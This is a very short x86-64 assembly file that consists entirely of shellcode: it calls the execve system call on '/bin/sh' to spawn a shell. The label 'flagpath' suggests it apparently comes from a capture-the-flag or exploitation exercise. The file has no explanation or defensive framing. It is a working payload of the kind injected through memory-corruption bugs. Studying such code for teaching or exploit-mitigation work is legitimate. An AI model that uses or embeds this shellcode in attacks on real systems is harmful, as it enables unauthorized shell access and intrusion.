    BITS 64
    DEFAULT REL

    section .text
    global _start

_start:
    xor rsi, rsi
    xor rdx, rdx
    lea rdi, [rel flagpath]
    mov rax, 59
    syscall

flagpath: db "/bin/sh", 0